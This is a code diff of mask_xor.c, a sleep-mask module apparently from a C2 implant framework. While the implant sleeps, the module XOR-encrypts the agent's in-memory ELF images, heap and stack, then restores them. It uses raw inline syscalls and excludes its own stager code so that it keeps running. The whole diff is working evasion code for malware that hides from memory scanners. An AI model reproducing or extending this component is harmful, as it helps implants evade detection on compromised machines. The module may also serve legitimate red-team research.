@@ -1,47 +1,54 @@
 /*
- * mask_xor.c — default sleep-mask provider: XOR the image in place.
+ * mask_xor.c — default sleep-mask provider: XOR the agent's memory in place.
  *
- * This code is part of the stager image, which is mapped separately from the
- * agent PIC. The agent calls it on its main thread after joining its workers,
- * so no thread can execute the image while it is being XORed. The function
- * makes the image writable, XORs every mapped PT_LOAD range with a random key,
- * sleeps, XORs the same bytes back, restores the original protections, and
- * returns to the (now unmasked) agent.
+ * This code lives in the stager image, which is mapped separately from the
+ * agent. The wrapper in mask.c switches to the stager's dedicated mask stack
+ * before calling this provider. The provider masks agent-owned memory: every
+ * anonymous ELF image plus the process [heap] and [stack]. Runtime mappings
+ * (libc/libld data, rseq/shadow-stack named mappings, the stager's own code
+ * and GOT) stay untouched so the stub and the running thread keep working.
+ *
+ * Everything between the first XOR and the second XOR must avoid libc: the
+ * agent's heap/stack are encrypted during that window. The timer is a raw
+ * nanosleep syscall, and the key is zeroed with a volatile loop.
  */
 
 #define _GNU_SOURCE
 #include "mask.h"
 
+#include "mask_ranges.h"
 
 #include "util/maps.h"
-#include "util/strings.h"
 #include "util/syscalls.h"
 #include "util/utils.h"
 
 #include <stdint.h>
 
 #define MASK_KEY_LEN 32
-#define MASK_MAX_MAPS 256
-#define MASK_MAX_RANGES 32
-#define MASK_MAX_PHNUM 1024
-#define MASK_MAP_BUF (256u * 1024u)
-#define MASK_O_RDONLY 0
+/* Generous enough for a heavily loaded process; truncation leaves mappings
+ * untouched rather than corrupting the map list. */
+#define MASK_MAX_MAPS 2048
+#define MASK_MAX_RANGES (MASK_MAX_MAPS * 2)
+#define MASK_MAP_BUF (512u * 1024u)
 
-#define MASK_ET_DYN 3
-#define MASK_ET_EXEC 2
-#define MASK_PT_LOAD 1
+/* The provider allocates its own scratch area instead of carrying large local
+ * arrays: users can replace this file without sizing the stub stack for it.
+ * The scratch mapping is path-less and non-ELF, so it is never selected for
+ * masking; it is explicitly excluded as well. */
+struct mask_scratch {
+  char text[MASK_MAP_BUF];
+  struct c2_map maps[MASK_MAX_MAPS];
+  struct c2_map ranges[MASK_MAX_RANGES];
+};
 
-static uint16_t rd16(const uint8_t *p) {
-  return (uint16_t)(p[0] | ((uint16_t)p[1] << 8));
-}
-
-static uint32_t rd32(const uint8_t *p) {
-  return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) |
-         ((uint32_t)p[3] << 24);
-}
-
-static uint64_t rd64(const uint8_t *p) {
-  return (uint64_t)rd32(p) | ((uint64_t)rd32(p + 4) << 32);
+static long mask_syscall(long n, long a1, long a2, long a3) {
+  unsigned long ret;
+  register long r10 __asm__("r10") = a3;
+  __asm__ __volatile__("syscall"
+                       : "=a"(ret)
+                       : "a"(n), "D"(a1), "S"(a2), "r"(r10)
+                       : "rcx", "r11", "memory");
+  return (long)ret;
 }
 
 static int read_full(int fd, void *buf, size_t len) {
@@ -60,220 +67,118 @@ static int read_full(int fd, void *buf, size_t len) {
   return (int)off;
 }
 
-struct mask_range {
-  uintptr_t start;
-  size_t len;
-  int prot;
-};
-
-struct mask_elf {
-  uintptr_t base;
-  uintptr_t span;
-  uintptr_t bias;
-  int elf64;
-  uint64_t phoff;
-  uint16_t phentsize;
-  uint16_t phnum;
-  struct mask_range segs[MASK_MAX_RANGES];
-  size_t nsegs;
-};
-
-/* Validate the ELF at `base` and collect its page-aligned PT_LOAD segments. */
-static int elf_open(uintptr_t base, uintptr_t map_end, uintptr_t probe,
-                    struct mask_elf *e) {
-  const uint8_t *eh = (const uint8_t *)base;
-  if (eh[0] != 0x7f || eh[1] != 'E' || eh[2] != 'L' || eh[3] != 'F')
-    return 0;
-  if (eh[4] != 1 && eh[4] != 2)
-    return 0;
-  if (eh[5] != 1) /* little-endian targets only */
-    return 0;
-
-  e->base = base;
-  e->elf64 = eh[4] == 2;
-  uint16_t type = rd16(eh + 16);
-  if (type != MASK_ET_DYN && type != MASK_ET_EXEC)
-    return 0;
-  e->phoff = e->elf64 ? rd64(eh + 32) : rd32(eh + 28);
-  e->phentsize = e->elf64 ? rd16(eh + 54) : rd16(eh + 42);
-  e->phnum = e->elf64 ? rd16(eh + 56) : rd16(eh + 44);
-  size_t min_ph = e->elf64 ? 56u : 32u;
-  if (e->phentsize < min_ph || e->phnum == 0 || e->phnum > MASK_MAX_PHNUM)
-    return 0;
-
-  uint64_t phbytes = (uint64_t)e->phnum * e->phentsize;
-  if (e->phoff > (uint64_t)UINTPTR_MAX || phbytes > (uint64_t)UINTPTR_MAX)
-    return 0;
-  uintptr_t phstart = base + (uintptr_t)e->phoff;
-  if (phstart < base || phstart + (uintptr_t)phbytes < phstart ||
-      phstart + (uintptr_t)phbytes > map_end)
-    return 0;
-
-  e->bias = type == MASK_ET_DYN ? base : 0;
-  uintptr_t max_end = 0;
-  int found = 0;
-  e->nsegs = 0;
-  for (uint16_t i = 0; i < e->phnum; i++) {
-    const uint8_t *ph =
-        (const uint8_t *)(phstart + (uintptr_t)i * e->phentsize);
-    if (rd32(ph) != MASK_PT_LOAD)
-      continue;
-    uint64_t vaddr = e->elf64 ? rd64(ph + 16) : rd32(ph + 8);
-    uint64_t memsz = e->elf64 ? rd64(ph + 40) : rd32(ph + 20);
-    if (memsz == 0)
-      continue;
-    uintptr_t seg_start = (uintptr_t)(e->bias + vaddr);
-    uintptr_t seg_end = seg_start + (uintptr_t)memsz;
-    if (seg_end <= seg_start)
-      return 0;
-    if (probe >= seg_start && probe < seg_end)
-      found = 1;
-    if (seg_end > max_end)
-      max_end = seg_end;
-    if (e->nsegs < MASK_MAX_RANGES) {
-      e->segs[e->nsegs].start = seg_start & ~(uintptr_t)(PAGE_SIZE - 1);
-      e->segs[e->nsegs].len =
-          ((seg_end + PAGE_SIZE - 1) & ~(uintptr_t)(PAGE_SIZE - 1)) -
-          e->segs[e->nsegs].start;
-      e->nsegs++;
-    }
-  }
-  if (!found || max_end <= base)
-    return 0;
-  e->span = max_end - base;
-  return 1;
-}
-
-/* Append the mappings that overlap the parsed image's PT_LOAD segments. */
-static size_t add_image_ranges(const struct mask_elf *e,
-                               const struct c2_map *maps, size_t nmaps,
-                               struct mask_range *ranges, size_t cap,
-                               size_t n) {
-  for (size_t i = 0; i < nmaps && n < cap; i++) {
-    if (maps[i].start < e->base || maps[i].start >= e->base + e->span)
-      continue;
-    int belongs = 0;
-    for (size_t j = 0; j < e->nsegs; j++) {
-      uintptr_t seg_end = e->segs[j].start + e->segs[j].len;
-      if (maps[i].start < seg_end && e->segs[j].start < maps[i].end) {
-        belongs = 1;
-        break;
-      }
-    }
-    if (!belongs)
-      continue;
-    int duplicate = 0;
-    for (size_t j = 0; j < n; j++) {
-      if (maps[i].start >= ranges[j].start &&
-          maps[i].end <= ranges[j].start + ranges[j].len) {
-        duplicate = 1;
-        break;
-      }
-    }
-    if (duplicate)
-      continue;
-    ranges[n].start = maps[i].start;
-    ranges[n].len = (size_t)(maps[i].end - maps[i].start);
-    ranges[n].prot = maps[i].prot;
-    n++;
-  }
-  return n;
-}
-
-static int find_ranges(uintptr_t probe, struct mask_range *ranges, size_t cap) {
-  int fd = open("/proc/self/maps", MASK_O_RDONLY, 0);
+static size_t find_ranges(struct mask_scratch *sc, uintptr_t keep_start,
+                          uintptr_t keep_end, uintptr_t fs_base,
+                          uintptr_t gs_base, uintptr_t code_probe) {
+  char *text = sc->text;
+  struct c2_map *maps = sc->maps;
+  struct c2_map *ranges = sc->ranges;
+  size_t cap = MASK_MAX_RANGES;
+  int fd = open("/proc/self/maps", O_RDONLY, 0);
   if (fd < 0)
     return 0;
-  char *text = (char *)mmap(NULL, MASK_MAP_BUF, PROT_READ | PROT_WRITE,
-                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-  if (text == MAP_FAILED) {
-    close(fd);
-    return 0;
-  }
   int nread = read_full(fd, text, MASK_MAP_BUF - 1);
   close(fd);
-  if (nread <= 0) {
-    munmap(text, MASK_MAP_BUF);
+  if (nread <= 0)
     return 0;
-  }
   text[nread] = '\0';
 
-  struct c2_map maps[MASK_MAX_MAPS];
-  size_t nmaps = 0;
-  nmaps = c2_maps_parse(text, (size_t)nread, maps, MASK_MAX_MAPS);
-
-  size_t probe_idx = nmaps;
+  size_t nmaps = c2_maps_parse(text, (size_t)nread, maps, MASK_MAX_MAPS);
+  uintptr_t code_end = 0;
   for (size_t i = 0; i < nmaps; i++) {
-    if (probe >= maps[i].start && probe < maps[i].end) {
-      probe_idx = i;
+    if (maps[i].anonymous && (maps[i].prot & PROT_EXEC) &&
+        maps[i].start <= code_probe && code_probe < maps[i].end) {
+      code_end = maps[i].end;
       break;
     }
   }
   size_t n = 0;
-  if (probe_idx != nmaps) {
-    struct mask_elf image;
-    for (size_t i = probe_idx + 1; i-- > 0;) {
-      if (!(maps[i].prot & PROT_READ) || maps[i].start > probe)
-        continue;
-      if (elf_open(maps[i].start, maps[i].end, probe, &image)) {
-        n = add_image_ranges(&image, maps, nmaps, ranges, cap, n);
-        break;
-      }
+  for (size_t i = 0; i < nmaps; i++) {
+    /* Anonymous [heap], [stack], [anon:...] and path-less mappings are the
+     * agent's private memory. File-backed code/data (libc, the stager image)
+     * and kernel mappings ([vdso], [vvar]) are not agent state. */
+    if (!maps[i].anonymous || !(maps[i].prot & PROT_READ))
+      continue;
+    int take = maps[i].special == C2_MAP_SPECIAL_HEAP ||
+               maps[i].special == C2_MAP_SPECIAL_STACK;
+    if (!take && maps[i].anonymous && maps[i].end - maps[i].start >= 4) {
+      const uint8_t *m = (const uint8_t *)maps[i].start;
+      take = m[0] == 0x7f && m[1] == 'E' && m[2] == 'L' && m[3] == 'F';
     }
-  }
-
-  /* Malasada's stage0 can leave a decompressed copy of the agent SO in an
-   * anonymous mapping separate from the segments it maps. Mask every anonymous
-   * ELF image, not just the one containing the probe, so no plaintext copy of
-   * the agent survives the sleep. */
-  for (size_t i = 0; i < nmaps && n < cap; i++) {
-    if (!maps[i].anonymous || !(maps[i].prot & PROT_READ) ||
-        maps[i].end - maps[i].start < 4)
+    if (!take)
       continue;
-    const uint8_t *m = (const uint8_t *)maps[i].start;
-    if (m[0] != 0x7f || m[1] != 'E' || m[2] != 'L' || m[3] != 'F')
+    /* The running stub needs the thread's TLS mapping (errno, stack cookie,
+     * rseq). The stager's own GS state is already in the keep range. The
+     * stager code may itself be an anonymous PIC mapping; never encrypt it. */
+    if (fs_base != 0 && maps[i].start <= fs_base && fs_base < maps[i].end)
       continue;
-    struct mask_elf image;
-    if (elf_open(maps[i].start, maps[i].end, maps[i].start, &image))
-      n = add_image_ranges(&image, maps, nmaps, ranges, cap, n);
+    if (gs_base != 0 && maps[i].start <= gs_base && gs_base < maps[i].end)
+      continue;
+    if (maps[i].start <= code_probe && code_probe < maps[i].end)
+      continue;
+    /* A raw PIC stager's writable data immediately follows its anonymous RX
+     * image; it belongs to the stub, not the agent. */
+    if (code_end != 0 && maps[i].start == code_end)
+      continue;
+    n = mask_add_map(maps[i].start, maps[i].end, maps[i].prot, keep_start,
+                     keep_end, (uintptr_t)sc, (uintptr_t)sc + sizeof(*sc),
+                     ranges, cap, n);
   }
-
-  munmap(text, MASK_MAP_BUF);
-  return (int)n;
+  return n;
 }
 
-static int xor_ranges(const struct mask_range *ranges, size_t n,
-                      const uint8_t *key) {
+static void xor_ranges(const struct c2_map *ranges, size_t n,
+                       const uint8_t *key) {
   for (size_t i = 0; i < n; i++) {
     volatile uint8_t *p = (volatile uint8_t *)ranges[i].start;
-    for (size_t j = 0; j < ranges[i].len; j++)
+    size_t len = (size_t)(ranges[i].end - ranges[i].start);
+    for (size_t j = 0; j < len; j++)
       p[j] ^= key[j % MASK_KEY_LEN];
   }
-  return 0;
 }
 
-int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe) {
-  struct mask_range ranges[MASK_MAX_RANGES];
-  int n = find_ranges(probe, ranges, MASK_MAX_RANGES);
-  if (n <= 0)
+static void zero_key(volatile uint8_t *key, size_t len) {
+  for (size_t i = 0; i < len; i++)
+    key[i] = 0;
+}
+
+int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
+                               uintptr_t keep_start, uintptr_t keep_end) {
+  (void)probe;
+  uintptr_t fs_base = 0;
+  uintptr_t gs_base = 0;
+  (void)mask_syscall(SYS_arch_prctl, ARCH_GET_FS, (long)&fs_base, 0);
+  (void)mask_syscall(SYS_arch_prctl, ARCH_GET_GS, (long)&gs_base, 0);
+  uintptr_t code_probe = (uintptr_t)(void *)&stager_mask_provider_sleep;
+  struct mask_scratch *sc =
+      (struct mask_scratch *)mmap(NULL, sizeof(*sc), PROT_READ | PROT_WRITE,
+                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (sc == MAP_FAILED)
     return -1;
+  struct c2_map *ranges = sc->ranges;
+  size_t n = find_ranges(sc, keep_start, keep_end, fs_base, gs_base, code_probe);
+  if (n == 0) {
+    munmap(sc, sizeof(*sc));
+    return -1;
+  }
 
   int ok = 1;
-  for (int i = 0; i < n; i++)
-    if (mprotect((void *)ranges[i].start, ranges[i].len,
+  for (size_t i = 0; i < n; i++)
+    if (mprotect((void *)ranges[i].start,
+                 (size_t)(ranges[i].end - ranges[i].start),
                  PROT_READ | PROT_WRITE) != 0) {
       ok = 0;
       goto restore;
     }
 
   uint8_t key[MASK_KEY_LEN];
-  if (syscall3(SYS_getrandom, (long)key, MASK_KEY_LEN, 0) != MASK_KEY_LEN) {
-    memset(key, 0, sizeof(key));
+  if (mask_syscall(SYS_getrandom, (long)key, MASK_KEY_LEN, 0) !=
+      MASK_KEY_LEN) {
     for (size_t i = 0; i < sizeof(key); i++)
       key[i] = (uint8_t)(i * 131u + (unsigned)seconds);
   }
 
-  xor_ranges(ranges, (size_t)n, key);
+  xor_ranges(ranges, n, key);
 
   struct timespec {
     long tv_sec;
@@ -283,15 +188,18 @@ int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe) {
   ts.tv_nsec = 0;
   long rc;
   do {
-    rc = syscall2(SYS_nanosleep, (long)&ts, (long)&ts);
+    rc = mask_syscall(SYS_nanosleep, (long)&ts, (long)&ts, 0);
   } while (rc == -4);
 
-  xor_ranges(ranges, (size_t)n, key);
-  memset(key, 0, sizeof(key));
+  xor_ranges(ranges, n, key);
+  zero_key(key, sizeof(key));
 
 restore:
-  for (int i = 0; i < n; i++)
-    if (mprotect((void *)ranges[i].start, ranges[i].len, ranges[i].prot) != 0)
+  for (size_t i = 0; i < n; i++)
+    if (mprotect((void *)ranges[i].start,
+                 (size_t)(ranges[i].end - ranges[i].start),
+                 ranges[i].prot) != 0)
       ok = 0;
+  munmap(sc, sizeof(*sc));
   return ok ? 0 : -1;
 }
